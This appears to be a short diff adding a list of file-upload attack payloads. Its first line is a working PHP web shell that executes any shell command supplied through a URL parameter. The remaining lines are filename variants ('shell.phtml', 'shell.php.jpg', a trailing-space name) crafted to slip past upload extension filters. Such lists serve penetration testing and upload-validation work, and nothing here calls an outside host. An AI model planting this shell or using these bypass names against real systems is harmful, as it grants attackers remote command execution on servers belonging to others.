@@ -1,0 +1,4 @@
+shell.php: <?php system($_GET['c']); ?>
+shell.phtml
+shell.php.jpg
+shell.php 
